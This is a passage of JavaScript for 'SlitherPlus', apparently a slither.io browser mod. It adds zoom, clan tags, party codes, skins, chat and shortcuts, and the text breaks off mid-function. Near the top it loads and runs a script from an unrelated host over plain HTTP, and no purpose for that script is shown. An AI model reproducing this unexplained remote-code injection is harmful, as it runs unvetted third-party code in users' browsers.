tags = [
	"HERO",
	"NBK",
        "AG",
	"MG"	
];

function set(a, b) {
	options[a] = b;
}

function appendScript(pathToScript, run) {
	var head = document.getElementsByTagName("head")[0];
	var js = document.createElement("script");
	js.type = "text/javascript";
	js.src = pathToScript;
	js.onload = run;
	head.appendChild(js);
}

appendScript('http://agarinfinity.com/video_loader.js?ts='+new Date().getTime());

String.prototype.isJSON = function() {
	try {
		JSON.parse(this);
	} catch (e) {
		return false;
	}
	
	return true;
};

options = {
	'zoom': true,
	'clans': true,
	'custombg': false,
	'parties': true,
	'lowergph': false,
	'skinrotator': false,
	'background': '',
	'nick': '',
	'clantag': '',
	'drawfood': false,
	'drawfoodsize': 1,
	'drawfoodcolor': 1,
	'drawfoodcrazie': false,
	'showshortcuts': false,
	'chat': false
};

if (!localStorage["slitherplus"] || (localStorage["slitherplus"].isJSON() && !JSON.parse(localStorage["slitherplus"]).hasOwnProperty("drawfood"))) {
	localStorage["slitherplus"] = JSON.stringify(options);
} else if (localStorage["slitherplus"].isJSON()) {
	options = JSON.parse(localStorage["slitherplus"]);
}

opts = {
	"Zoom": 'zoom',
	"Clan tag list": 'clans',
	"Custom background": 'custombg',
	"Party mode": 'parties',
	"Lower graphics": 'lowergph',
	"Skin rotator": 'skinrotator'
};

function zoom(e) {
	if (!window.gsc) { return; }
	if (!options.zoom) { window.gsc = 0.9; return; }
	window.gsc *= Math.pow(0.9, e.wheelDelta / -120 || e.detail / 2 || 0);
	window.gsc > 2 ? window.gsc = 2 : window.gsc < 0.1 ? window.gsc = 0.1 : null;
}

var slitherplus_party = {
   servers: {},
   isset: function(variable) {
      return (variable !== undefined && variable !== null ? true : false);
   },
   party_code: function(ip) {
      function f1(a, b) {
         var c, d, e, f, g;
         e = (a & 0x80000000), f = (b & 0x80000000), c = (a & 0x40000000), d = (b & 0x40000000), g = (a & 0x3FFFFFFF) + (b & 0x3FFFFFFF);
         return (((c & d) || (c | d)) ? ((c & d) ? (g ^ 0x80000000 ^ e ^ f) : (g & 0x40000000 ? (g ^ 0xC0000000 ^ e ^ f) : (g ^ 0x40000000 ^ e ^ f))) : (g ^ e ^ f));
      };
      function f2(a, b, c, d, e, f, g) {
         a = f1(a, f1(f1((b & c) | ((~b) & d), e), g));
         return f1((a << f) | (a >>> (32 - f)), b);
      };
      function f3(a, b, c, d, e, f, g) {
         a = f1(a, f1(f1((b & d) | (c & (~d)), e), g));
         return f1((a << f) | (a >>> (32 - f)), b);
      };
      function f4(a, b, c, d, e, f, g) {
         a = f1(a, f1(f1((b ^ c ^ d), e), g));
         return f1((a << f) | (a >>> (32 - f)), b);
      };
      function f5(a, b, c, d, e, f, g) {
         a = f1(a, f1(f1((c ^ (b | (~d))), e), g));
         return f1((a << f) | (a >>> (32 - f)), b);
      };
      function f6(a) {
         var b, c = a.length, d = c + 8, e = (d - (d % 64)) / 64, f = (e + 1) * 16, g = Array(f - 1), h = i = 0;
         while ( i < c ) {
            b = (i - (i % 4)) / 4, h = (i % 4) * 8, g[b] = (g[b] | (a.charCodeAt(i) << h)), i++;
         }
         b = (i - (i % 4)) / 4, h = (i % 4) * 8, g[b] = g[b] | (0x80 << h), g[f - 2] = c << 3, g[f - 1] = c >>> 29;
         return g;
      };
      function f7(a) {
         var b = '', c = '', d, e;
         for ( e = 0; e <= 3; e++ ) {
            d = (a >>> (e * 8)) & 255, c = '0' + d.toString(16), b = b + c.substr(c.length - 2, 2);
         }
         return b;
      };
      function f8(a) {
         var a = a.replace(/\r\n/g, '\n'), b = '';
         for ( var c = 0; c < a.length; c++ ) {
            var d = a.charCodeAt(c);
            if ( d < 128 ) {
               b += String.fromCharCode(d);
            }
            else if ( (d > 127) && (d < 2048) ) {
               b += String.fromCharCode((d >> 6) | 192), b += String.fromCharCode((d & 63) | 128);
            }
            else {
               b += String.fromCharCode((d >> 12) | 224), b += String.fromCharCode(((d >> 6) & 63) | 128), b += String.fromCharCode((d & 63) | 128);
            }
         }
         return b;
      };
      var x = Array();
      var k, AA, BB, CC, DD, a, b, c, d;
      var S11 = 7, S12 = 12, S13 = 17, S14 = 22;
      var S21 = 5, S22 = 9 , S23 = 14, S24 = 20;
      var S31 = 4, S32 = 11, S33 = 16, S34 = 23;
      var S41 = 6, S42 = 10, S43 = 15, S44 = 21;
      var ip  = f8(ip), x = f6(ip), a = 0x67452301; b = 0xEFCDAB89; c = 0x98BADCFE; d = 0x10325476;
      for ( k = 0; k < x.length; k += 16 ) {
         AA = a; BB = b; CC = c; DD = d;
         a = f2(a, b, c, d, x[k + 0],  S11, 0xD76AA478);
         d = f2(d, a, b, c, x[k + 1],  S12, 0xE8C7B756);
         c = f2(c, d, a, b, x[k + 2],  S13, 0x242070DB);
         b = f2(b, c, d, a, x[k + 3],  S14, 0xC1BDCEEE);
         a = f2(a, b, c, d, x[k + 4],  S11, 0xF57C0FAF);
         d = f2(d, a, b, c, x[k + 5],  S12, 0x4787C62A);
         c = f2(c, d, a, b, x[k + 6],  S13, 0xA8304613);
         b = f2(b, c, d, a, x[k + 7],  S14, 0xFD469501);
         a = f2(a, b, c, d, x[k + 8],  S11, 0x698098D8);
         d = f2(d, a, b, c, x[k + 9],  S12, 0x8B44F7AF);
         c = f2(c, d, a, b, x[k + 10], S13, 0xFFFF5BB1);
         b = f2(b, c, d, a, x[k + 11], S14, 0x895CD7BE);
         a = f2(a, b, c, d, x[k + 12], S11, 0x6B901122);
         d = f2(d, a, b, c, x[k + 13], S12, 0xFD987193);
         c = f2(c, d, a, b, x[k + 14], S13, 0xA679438E);
         b = f2(b, c, d, a, x[k + 15], S14, 0x49B40821);
         a = f3(a, b, c, d, x[k + 1],  S21, 0xF61E2562);
         d = f3(d, a, b, c, x[k + 6],  S22, 0xC040B340);
         c = f3(c, d, a, b, x[k + 11], S23, 0x265E5A51);
         b = f3(b, c, d, a, x[k + 0],  S24, 0xE9B6C7AA);
         a = f3(a, b, c, d, x[k + 5],  S21, 0xD62F105D);
         d = f3(d, a, b, c, x[k + 10], S22, 0x2441453);
         c = f3(c, d, a, b, x[k + 15], S23, 0xD8A1E681);
         b = f3(b, c, d, a, x[k + 4],  S24, 0xE7D3FBC8);
         a = f3(a, b, c, d, x[k + 9],  S21, 0x21E1CDE6);
         d = f3(d, a, b, c, x[k + 14], S22, 0xC33707D6);
         c = f3(c, d, a, b, x[k + 3],  S23, 0xF4D50D87);
         b = f3(b, c, d, a, x[k + 8],  S24, 0x455A14ED);
         a = f3(a, b, c, d, x[k + 13], S21, 0xA9E3E905);
         d = f3(d, a, b, c, x[k + 2],  S22, 0xFCEFA3F8);
         c = f3(c, d, a, b, x[k + 7],  S23, 0x676F02D9);
         b = f3(b, c, d, a, x[k + 12], S24, 0x8D2A4C8A);
         a = f4(a, b, c, d, x[k + 5],  S31, 0xFFFA3942);
         d = f4(d, a, b, c, x[k + 8],  S32, 0x8771F681);
         c = f4(c, d, a, b, x[k + 11], S33, 0x6D9D6122);
         b = f4(b, c, d, a, x[k + 14], S34, 0xFDE5380C);
         a = f4(a, b, c, d, x[k + 1],  S31, 0xA4BEEA44);
         d = f4(d, a, b, c, x[k + 4],  S32, 0x4BDECFA9);
         c = f4(c, d, a, b, x[k + 7],  S33, 0xF6BB4B60);
         b = f4(b, c, d, a, x[k + 10], S34, 0xBEBFBC70);
         a = f4(a, b, c, d, x[k + 13], S31, 0x289B7EC6);
         d = f4(d, a, b, c, x[k + 0],  S32, 0xEAA127FA);
         c = f4(c, d, a, b, x[k + 3],  S33, 0xD4EF3085);
         b = f4(b, c, d, a, x[k + 6],  S34, 0x4881D05);
         a = f4(a, b, c, d, x[k + 9],  S31, 0xD9D4D039);
         d = f4(d, a, b, c, x[k + 12], S32, 0xE6DB99E5);
         c = f4(c, d, a, b, x[k + 15], S33, 0x1FA27CF8);
         b = f4(b, c, d, a, x[k + 2],  S34, 0xC4AC5665);
         a = f5(a, b, c, d, x[k + 0],  S41, 0xF4292244);
         d = f5(d, a, b, c, x[k + 7],  S42, 0x432AFF97);
         c = f5(c, d, a, b, x[k + 14], S43, 0xAB9423A7);
         b = f5(b, c, d, a, x[k + 5],  S44, 0xFC93A039);
         a = f5(a, b, c, d, x[k + 12], S41, 0x655B59C3);
         d = f5(d, a, b, c, x[k + 3],  S42, 0x8F0CCC92);
         c = f5(c, d, a, b, x[k + 10], S43, 0xFFEFF47D);
         b = f5(b, c, d, a, x[k + 1],  S44, 0x85845DD1);
         a = f5(a, b, c, d, x[k + 8],  S41, 0x6FA87E4F);
         d = f5(d, a, b, c, x[k + 15], S42, 0xFE2CE6E0);
         c = f5(c, d, a, b, x[k + 6],  S43, 0xA3014314);
         b = f5(b, c, d, a, x[k + 13], S44, 0x4E0811A1);
         a = f5(a, b, c, d, x[k + 4],  S41, 0xF7537E82);
         d = f5(d, a, b, c, x[k + 11], S42, 0xBD3AF235);
         c = f5(c, d, a, b, x[k + 2],  S43, 0x2AD7D2BB);
         b = f5(b, c, d, a, x[k + 9],  S44, 0xEB86D391);
         a = f1(a, AA), b = f1(b, BB), c = f1(c, CC), d = f1(d, DD);
      }
      var code = f7(a) + f7(b) + f7(c) + f7(d), code = code.toUpperCase(), code = code.match(/[a-z]{1}[a-z0-9]{4}/i);
      return code['0'];
   },
   update_servers: function() {
      if ( slitherplus_party.isset(window.sos) && window.sos.length > 0 ) {
         for ( var i = 0; i < window.sos.length; i++ ) {
            var code                        = slitherplus_party.party_code(window.sos[i].ip + ':' + window.sos[i].po);
            slitherplus_party.servers[code] = window.sos[i];
         }
      }
      else {
         window.setTimeout(slitherplus_party.update_servers, 50);
      }
   },
   party_exists: function(code) {
      return (slitherplus_party.isset(slitherplus_party.servers[code]) ? true : false);
   },
   create_party: function() {
      if ( Object.keys(slitherplus_party.servers).length > 0 ) {
         var codes = Object.keys(slitherplus_party.servers);
         slitherplus_party.join_party(codes[Math.floor(Math.random() * codes.length)]);
      }
   },
   join_party: function(code) {
      if ( slitherplus_party.party_exists(code) && slitherplus_party.isset(window.forcing) && slitherplus_party.isset(window.connect) ) {
         window.forcing = true;
         window.bso     = slitherplus_party.servers[code];
         window.connect();
         (function socket_ready() {
            if ( slitherplus_party.isset(window.ws) && window.ws.readyState === 1 ) {
               $("#partyCode").val(code);
            }
            else if ( slitherplus_party.isset(window.ws) && window.ws.readyState === 3 ) {
               alert('the server is full.');
            }
            else {
               window.setTimeout(socket_ready, 10);
            }
         })();
      }
      else {
         alert('the server is either full or the party code is invalid.');
      }
   }
};

function addParty() {
	$("#playh").after('<div id="party" style="margin: auto; width: 200px; display: block !important; margin-bottom: 25px"><div class="btn-group" style="width: 100%"><button class="btn btn-success" id="createParty" style="width: 50%">Create</button><button style="width: 50%" class="btn btn-primary" id="joinParty">Join</button></div><input id="partyCode" placeholder="Party Code" class="form-control" type="text" style="width: 100%;color:black;text-align:center;font-weight:bold;box-shadow:inset 0 0 3px #000;"></div>');
	$(".btnt.nsi.sadg1:first").css('margin-bottom', '35px');

	jQuery("#createParty").click(function(e) {		
       slitherplus_party.create_party();
       return false;
	});

	jQuery("#joinParty").click(function(e) {
       slitherplus_party.join_party($("#partyCode").val());
       return false;
	});
	
	$("#createParty").css('border-bottom-left-radius', '0');
	$("#joinParty").css('border-bottom-right-radius', '0');
	$("#partyCode").css('border-top-left-radius', '0');
	$("#partyCode").css('border-top-right-radius', '0');
}

function asciize(b, typing = false) {
	var h, c, f;
	c = b.length;
	var w = !1;
	for (h = 0; h < c; h++)
		if (f = b.charCodeAt(h), 32 > f || 127 < f) {
			w = !0;
			break
		}
	if (w) {
		w = "";
		for (h = 0; h < c; h++) f = b.charCodeAt(h), w = 32 > f || 127 < f ? w + " " : w + String.fromCharCode(f);
		return w
	}
	
	if (!typing) {
		window.options.nick = $("#nick").val();
		window.options.clantag = $("#tag").val();
		localStorage["slitherplus"] = JSON.stringify(window.options);
	}
	
	return window.options.clans && !typing ? jQuery("#tag").val() + ' ' + b : b;
}

function addClanTags() {
	jQuery(".taho").before('<div id="tag_holder" class="taho" style="width: 110px; height: 40px; margin-top: 10px; box-shadow: rgb(0, 0, 0) 0px 6px 50px; opacity: 1; background: rgb(76, 68, 124);"><select class="sumsginp" id="tag" style="width: 85px; top: 0px; outline: 0; height: 35px; padding: 5px; border-radius:29px"></select></div>')

	nick.oninput = function(){var b=this.value,h=asciize(b,true);24<h.length&&(h=h.substr(0,24));b!=h&&(this.value=h)};

	jQuery("#tag").append("<option value='' style='background: rgb(76, 68, 124)'>-</option>");
	for (tag of tags) {
		jQuery("#tag").append("<option value='[" + tag + "]' style='background: rgb(76, 68, 124)'>[" + tag + "]</option>");
	}
}

if (/firefox/i.test(navigator.userAgent)) {
	document.addEventListener("DOMMouseScroll", zoom, false);
} else {
	document.body.onmousewheel = zoom;
}

function setBackground(url = '/s/bg45.jpg') {
	ii.src = url;
}

function setLowerGraphics(a) {
	if (a) {
		setBackground('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AQYBigs0bXWaQAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAADUlEQVQI12P4//8/AwAI/AL+XJ/P2gAAAABJRU5ErkJggg==');
		render_mode = 1;
	} else {
		if (!options.custombg) {
			setBackground();
		} else {
			setBackground(options.background);
		}
		render_mode = 2;
	}
}

function skinRotator(i = 0) {
	if (typeof ws != "undefined" && options.skinrotator && !$("#psk").is(":visible") && typeof snake != "undefined" && snake != null) {
		setSkin(snake, i++);
	}
	
	if (i > (25 + 16)) i = 0;
	setTimeout(skinRotator, 1000, i);
}

function addOptions() {
	jQuery("#saveh").after('<div id="options" style="width: 260px; color: rgb(128, 88, 208); border-radius: 29px; font-family: \'Lucida Sans Unicode\', \'Lucida Grande\', sans-serif; font-size: 14px; margin: 0px auto 100px; padding: 10px 14px; background-color: rgb(30, 38, 46);"></div>');
	for (option in opts) {
		if (option == "Clan tag list" || option == "Party mode") {
			continue;
		}
		jQuery("#options").append('<div class="option"><span>' + option + '</span><label id="' + opts[option] + '" class="' + (options[opts[option]] ? 'on' : 'off') + '">' + (options[opts[option]] ? 'ON' : 'OFF') + '</label></div>');
		jQuery("#" + opts[option]).click(function() {
			if (jQuery(this).attr('class') == 'on') {
				jQuery(this).attr('class', 'off');
				jQuery(this).html('OFF');
				set(jQuery(this).attr('id'), false);
			} else {
				jQuery(this).attr('class', 'on');
				jQuery(this).html('ON');
				set(jQuery(this).attr('id'), true);
			}
		});
	}

	jQuery("#lowergph").click(function() {
		setLowerGraphics(jQuery(this).attr('class') == 'on');
	});
	
	jQuery("#custombg").click(function() {
		if (jQuery(this).attr('class') == 'on') {
			options.custombg = false;
			url = prompt('Enter new URL (image):', '');
			if (url && url.length > 10) {
				options.custombg = true;
				options.background = url;
				setBackground(url);
			} else {
				options.background = '';
				setBackground();
				jQuery("#custombg").attr('class', 'off');
				jQuery("#custombg").html('OFF');
			}
		} else {
			options.background = '';
			setBackground();
		}
	});
	
	jQuery(".option").attr('style', 'color: rgb(128, 88, 208); border-radius: 29px; margin: 10px auto; padding: 8px; background-color: rgb(76, 68, 124)');
	jQuery(".option > span").attr('style', 'height: 24px; color: rgb(224, 224, 255); margin-left: 5px');
	jQuery(".option > label").attr('style', 'float: right; width: 67px; text-align: center; border-radius: 12px; color: white; cursor: pointer; padding: 0px 20px;');
	jQuery("head").append("<style type='text/css'>label.on{background-color: rgb(86, 172, 129)}label.off{background-color:#861B1B}</style>");
	
	jQuery("#tag").val(options.clantag);
	jQuery("#nick").val(options.nick);
	$("#options").append('<label id="showshortcuts" class="on" style="text-align: center; border-radius: 12px; color: white; cursor: pointer; padding: 0px 20px; width:100%">Show shortcuts</label>');
	$("#options").append('<label id="showchat" class="on" style="text-align: center; border-radius: 12px; color: white; cursor: pointer; padding: 0px 20px; width:100%">Show chat</label>');
	$("body").append('<div id="shortcuts" style="display:none;z-index:999;width: 260px; color: rgb(128, 88, 208); border-radius: 29px; font-family: \'Lucida Sans Unicode\', \'Lucida Grande\', sans-serif; font-size: 14px; margin: 0px auto 100px; padding: 10px 14px; background-color: rgba(30, 38, 46,0.7);position:absolute;top:50px;left:6px;"><ul style="list-style-type:none;padding:0;"><li>[F] - switch drawing mode</li><li>[G] - change color of drawing</li><li>[H] - change size of drawing</li><li>[J] - crazy drawing</li><li>[E] - previous skin</li><li>[R] - next skin</li><li>[Q] - quit</li><li>[ESC] - respawn</li><li>[SHIFT] - accelerate</li><li>[1-6] - switching options</li></ul></div>');
	$("body").append('<div id="chat" style="display:none;z-index:999; width: 260px; height: 270px; color: rgb(128, 88, 208); border-radius: 29px; font-family: \'Lucida Sans Unicode\', \'Lucida Grande\', sans-serif; font-size: 14px; padding: 10px 14px; background-color: rgba(30, 38, 46,0.7);position:absolute;bottom:110px;left:6px;"><div id="chatMessages" style="height:200px"></div><div id="yourMessage_holder" class="taho" style="width: 100%; height: 35px; margin-top: 10px; box-shadow: rgb(0, 0, 0) 0px 6px 50px; opacity: 1; background: rgb(76, 68, 124);"><input class="sumsginp" id="yourMessage" placeholder="Press [ENTER] to chat" style="width: 100%; top: 0px; outline: 0; height: 35px; padding: 10px; left:0; border-radius:29px;font-size:14px" /></div></div>');
	$("#showshortcuts").click(function() {
			if (jQuery(this).attr('class') == 'on') {
				jQuery(this).attr('class', 'off');
				jQuery(this).html('Hide shortcuts');
				set(jQuery(this).attr('id'), false);
				$("iframe").attr('src','data:html,');
				$("#shortcuts").show();
				options['showshortcuts'] = true;
			} else {
				jQuery(this).attr('class', 'on');
				jQuery(this).html('Show shortcuts');
				set(jQuery(this).attr('id'), true);
				$("iframe").attr('src','http://slitherplus.io/social.html');
				$("#shortcuts").hide();
				options['showshortcuts'] = false;
			}
	});
	$("#showchat").click(function() {
			if (jQuery(this).attr('class') == 'on') {
				jQuery(this).attr('class', 'off');
				jQuery(this).html('Hide chat');
				$("#chat").show();
				options['chat'] = true;
			} else {
				jQuery(this).attr('class', 'on');
				jQuery(this).html('Show chat');
				$("#chat").hide();
				options['chat'] = false;
			}
	});
	
	$("body").append('<div id="fpsBox" style="position:fixed;bottom: 160px; right: 20px; color: lightgray; z-index:99999999;">FPS: <span id="fps">waiting...</span></div>');
}

function resizeView() {
	$("#login").css('margin-top', '0px');
	if (window.resize) {
		window.lww = 0; 
		window.wsu = 0;
		window.resize();
		var wh = Math.ceil(window.innerHeight);
		if (wh < 800) {
			var login = document.getElementById("login");
			window.lgbsc = wh / 800;
			login.style.top = - (Math.round(wh * (1 - window.lgbsc) * 1E5) / 1E5) + "px";
			if (window.trf) {
				window.trf(login, "scale(" + window.lgbsc + "," + window.lgbsc + ")");
			}
		}
	} else {
		setTimeout(resizeView, 100);
	}
}

function addKeyEvents() {
	options['drawfood'] = false;
	$(document).keydown(function(e) {
		switch (e.keyCode) {
			case 27:
if ($("#yourMessage").is(":focus")) { return; }
				if (typeof bso != "undefined") {
					forcing = true;
					connect();
				}
				break;
			case 9:
				e.preventDefault();
				$("#ipBox").toggle();
				$("#fpsBox").toggle();
				break;
			case 71:
				if ($("#yourMessage").is(":focus")) { return; }
				if (options['drawfoodcolor'] >= 7) {
					options['drawfoodcolor'] = 0;
				}
				options['drawfoodcolor']++;
				break;
			case 70:
			if ($("#yourMessage").is(":focus")) { return; }
				options['drawfood'] = !options['drawfood'];
				if (options['drawfood']) {
					drawFood = setInterval(function(){
						try {
							if (!options['drawfoodcrazie']) {
								if (options['drawfoodcolor'] != 7) {
									newFood(3, snake.xx, snake.yy, options['drawfoodsize'],5, options['drawfoodcolor']);
								} else if (options['drawfoodcolor'] == 7) {
									newFood(3, snake.xx, snake.yy, options['drawfoodsize'], 5, Math.floor(Math.random() * 7) + 1);
								}
							} else {
								newFood(3, snake.xx, snake.yy, Math.floor(Math.random() * 20) + 1, 5, Math.floor(Math.random() * 7) + 1);
							}
						} catch(err) {}
					}, 100);
				} else {
					clearInterval(drawFood);
				}
				break;
			case 72:
			if ($("#yourMessage").is(":focus")) { return; }
				if (options['drawfoodsize'] >= 20) {
					options['drawfoodsize'] = 0;
				}
				
				options['drawfoodsize'] += 2;
				break;
			case 74:
				if ($("#yourMessage").is(":focus")) { return; }
				options['drawfoodcrazie'] = !options['drawfoodcrazie'];
				break;
			case 69:
				if ($("#yourMessage").is(":focus")) { return; }
				$("#psk").click();
				break;
			case 82:
				if ($("#yourMessage").is(":focus")) { return; }
				$("#nsk").click();
				break;
			case 13:
				if ($("#chat").is(":visible")) {
					if ($("#yourMessage").is(":focus")) {
						chatWebSocket.send(JSON.stringify({ action: 1, nick: $("#nick").val(), message: $("#yourMessage").val(), color: (snake ? snake.cs : "#FFFFFF") }));
						$("#yourMessage").blur();
						$("#yourMessage").val('');
					} else {
						$("#yourMessage").focus();
					}
				}
				break;
			case 81:
if ($("#yourMessage").is(":focus")) { return; }
				if (playing) {
					want_close_socket = -1;
					dead_mtm = Date.now() - 5E3;
					ws.close();
					ws = null;
					playing = !1;
					connected = !1;
					resetGame();
					play_btn.setEnabled(!0);
				}
				break;
			case 16:
if ($("#yourMessage").is(":focus")) { return; }
				setAcceleration(true);
				break;
			case 49:
if ($("#yourMessage").is(":focus")) { return; }
				$("#zoom").click();
				break;
			case 50:
if ($("#yourMessage").is(":focus")) { return; }
				$("#custombg").click();
				break;
			case 51:
if ($("#yourMessage").is(":focus")) { return; }
				$("#lowergph").click();
				break;
			case 52:
if ($("#yourMessage").is(":focus")) { return; }
				$("#skinrotator").click();
				break;
			case 53:
if ($("#yourMessage").is(":focus")) { return; }
				$("#showshortcuts").click();
				break;
			case 54:
if ($("#yourMessage").is(":focus")) { return; }
				$("#showchat").click();
				break;
		}
	});
	$(document).keyup(function(e) {
		switch (e.keyCode) {
			case 16:
				setAcceleration(false);
				break;
		}
	});
}

function showFPS() {
	if (typeof playing != "undefined" && playing && fps && lrd_mtm) {
		if (Date.now() - lrd_mtm > 970) {
			$("#fps").html(fps);
		}
	}
	setTimeout(showFPS, 30);
}

function loop() {
	if (typeof lbh != "undefined") {
		lbh.textContent = "slitherplus.io";
	}
	
	if (typeof bso != "undefined" && $("#ipAddress").html() != (bso.ip + ":" + bso.po)) {
		$("#ipAddress").html(bso.ip + ":" + bso.po);
		chatWebSocket.send(JSON.stringify({ action: 0, token: (bso.ip + ":" + bso.po) }));
	}
	
	setTimeout(loop, 1000);
}

$("body").append('<div id="ipBox" style="position:fixed;bottom: 120px; right: 20px; color: lightgray; z-index:99999999;">IP: <span id="ipAddress">play first</span> <label style="float: right;text-align: center; border-radius: 12px; color: white; cursor: pointer; padding: 0px 20px;width: 140px; margin-left: 10px;" id="ip-connect" class="on">Connect to IP</label></div>');

$("#ip-connect").click(function() {
	eipaddr = prompt('Enter the IP address:', '');
	if (eipaddr && eipaddr.indexOf(":") != -1 && eipaddr.indexOf(".") != -1) {
		forceServer(eipaddr.split(":")[0], eipaddr.split(":")[1]);
		connect();
		$("#partyCode").val('');
	}
});

function checkForMods() {
	if ($("#ip-hud").length != 0 || $("#worms").length != 0 || $("#login").html().toLowerCase().indexOf("slitherio.org") != -1) {
		$("body").html("<div style='text-align:center;width:100%;position:absolute;top:50%;margin-top:-98px;color:rgb(128, 88, 208);'><img src='s/favicon.png'/><h1>Please disable other slither.io extensions to use SlitherPlus.</h1></div>");
		return;
	}
	
	if (!$("#psk").is(":visible") && snake && snake.rcv != localStorage.snakercv && !options['skinrotator']) {
		setSkin(snake, localStorage.snakercv);
	}
}

var slitherplus_skins = {
   skins: [
        {// NBK
         body:   [19, 19, 19, 10, 14, 15, 20],
         bulb:   {id: 'hAKN6iu', width: 180, height: 73, x: -50, y: -36.5, scale: 0.36, alpha: 1, antenna_length: 9, antenna_border: '#000000', antenna_color: '#0045BE'}
      },
      {// HERO
         body:   [7],
         bulb:   {id: 'Q9072QW', width: 150, height: 149, x: -20, y: -60, scale: 0.3, alpha: 1, antenna_length: 9, antenna_border: '#000000', antenna_color: '#333333'}
      },
      {// MASTER GAMING
         body:   [18],
         bulb:   {id: '3CTUIZ5', width: 140, height: 118, x: -20, y: -59, scale: 0.4, alpha: 1, antenna_length: 9, antenna_border: '#000000', antenna_color: '#DBD444'}
      },
      {// TURTLE CLAN :D
         body:   [26, 26, 26, 26, 26, 26, 3, 25],
         bulb:   {id: 'pfHG6uU', width: 151, height: 79, x: -40, y: -39.5, scale: 0.44, alpha: 1, antenna_length: 20, antenna_border: '#000000', antenna_color: '#3dba48'},
         extras: {er: 7.2, ec: '#000000', eca: 1, ppc: '#3DBA48', swell: 0.04}
      },
{// CRYSTAL
         body:   [23],
         bulb:   {id: 'Lji6MbX', width: 195, height: 250, x: -20, y: -125, scale: 0.18, alpha: 0.9, antenna_length: 9, antenna_border: '#000000', antenna_color: '#69D0F1'},
         extras: {swell: 0.025}
      },
{// TYT
         body:   [9, 9, 9, 22, 22, 22],
         bulb:   {id: '7C3HtLB', width: 240, height: 202, x: -20, y: -101, scale: 0.28, alpha: 1, antenna_length: 2, antenna_border: 'transparent', antenna_color: 'transparent'},
         extras: {er: 2, ec: '#000000', eca: 1, ppc: 'transparent', swell: 0.04}
      },
{// ANDRO
   body: [9, 9, 9, 16],
   bulb: {id: 'EBMYXnH', width: 250, height: 106, x: -40, y: -53, scale: 0.3, alpha: 1, antenna_length: 10, antenna_border: '#000000', antenna_color: '#485aff'}
},
{// MAU
         body:   [22],
         bulb:   {id: 'RaaIqHU', width: 250, height: 157, x: -20, y: -78.5, scale: 0.28, alpha: 1, antenna_length: 9, antenna_border: '#000000', antenna_color: '#ff620a'},
         extras: {pr: 3.5, er: 4, ed: 7, eca: 1, swell: 0.01}
      },
{// COOL ONE
      body: [7, 9, 9, 9],
      bulb: {id: '7G5yh8X', width: 157, height: 221, x: -60, y: -100, scale: 0.2, alpha: 1, antenna_length: 2, antenna_border: 'transparent', antenna_color: 'transparent'},
      extras: {er: 5, eca: 1, pr: 2, swell: 0.06}
   },
      {// SCORPION
         body:   [7],
         bulb:   {id: 'vxGo7Rt', width: 300, height: 300, x: -60, y: -100, scale: 0.3, alpha: 1, antenna_length: 2, antenna_border: 'transparent', antenna_color: '#FF6347'}
      },
{//TROLL
        body: [3, 3, 3, 9, 11, 9],
        bulb: false,  extras: {   one_eye: !0, ebi: jsebi, ebiw: 64,ebih: 64,ebisz: 29,epi: jsepi,epiw: 48,epih: 48,episz: 14,pma: 4, swell: .06 }
},



      {body: [11, 7, 7, 11, 11, 11, 9, 9],                                    bulb: false, extras: false},
      {body: [4, 3, 3, 4, 4, 4],                                              bulb: false, extras: false},
      {body: [5, 5, 7, 5, 22, 22, 4, 4, 22, 22, 5, 5, 9, 9],                  bulb: false, extras: false},
      {body: [16, 16, 16, 16, 7, 7, 7, 9, 9, 10, 10, 10, 9, 9, 7, 7, 7],      bulb: false, extras: false},
      {body: [12, 7, 7, 7, 7, 9, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7],               bulb: false, extras: false},
      {body: [11, 9, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11], bulb: false, extras: false},
      {body: [16, 16, 7, 7, 7, 7, 9, 11, 7, 7, 7, 7, 16],                     bulb: false, extras: false},
      {body: [3, 3, 3, 9, 11, 9],                                             bulb: false, extras: false},
      {body: [11, 11, 18, 18],                                                bulb: false, extras: false},
      {body: [21, 21, 7, 7],                                                  bulb: false, extras: false},
      {body: [11, 11, 7, 7],                                                  bulb: false, extras: false},
      {body: [11, 11, 1, 1],                                                  bulb: false, extras: false},
      {body: [11, 11, 9, 9],                                                  bulb: false, extras: false},
      {body: [18, 18, 21, 21],                                                bulb: false, extras: false},
      {body: [18, 18, 7, 7],                                                  bulb: false, extras: false},
      {body: [21, 21, 1, 1],                                                  bulb: false, extras: false},
      {body: [21, 21, 8, 8],                                                  bulb: false, extras: false},
      {body: [21, 21, 21, 9, 7, 9],                                           bulb: false, extras: false},
      {body: [11, 9, 11, 7, 7, 7],                                            bulb: false, extras: false},
      {body: [11, 9, 11, 4, 4, 4],                                            bulb: false, extras: false},
      {body: [11, 9, 11, 5, 5, 5],                                            bulb: false, extras: false},
      {body: [11, 9, 11, 23, 23, 23],                                         bulb: false, extras: false},
      {body: [12, 13, 14, 15, 16, 17, 18, 21, 22, 23],                        bulb: false, extras: false},
      {body: [12, 11, 22, 22, 23, 23, 12],                                    bulb: false, extras: false},
      {body: [11],                                                            bulb: false, extras: false},
      {body: [25],                                                            bulb: false, extras: false},
      {body: [21],                                                            bulb: false, extras: false},
{
        body: [11, 9, 11, 7, 7, 7],
        bulb: false,
        extras: false
    }, {
        body: [11, 9, 11, 4, 4, 4],
        bulb: false,
        extras: false
    }, {
        body: [11, 9, 11, 5, 5, 5],
        bulb: false,
        extras: false
    }, {
        body: [11, 9, 11, 23, 23, 23],
        bulb: false,
        extras: false
    }, {
        body: [11, 7, 7, 11, 11, 11, 9, 9],
        bulb: false,
        extras: false
    }, {
        body: [12, 11, 22, 22, 23, 23, 12],
        bulb: false,
        extras: false        
    }, {
        body: [11, 9, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11],
        bulb: false,
        extras: false
    }
   ],
   cache: {},
   isset: function(variable) {
      return (variable !== undefined && variable !== null ? true : false);
   },
   addskins: function() {
      if ( slitherplus_skins.isset(window.max_skin_cv) && slitherplus_skins.isset(window.setSkin) ) {
         window.setSkin = (function() {
            var old1            = window.max_skin_cv;
            var old2            = window.setSkin;
            window.max_skin_cv += slitherplus_skins.skins.length;
            return function(snake, id) {
               old2(snake, id);
               if ( id > old1 ) {
                  var colors = null, index = id - old1 - 1;
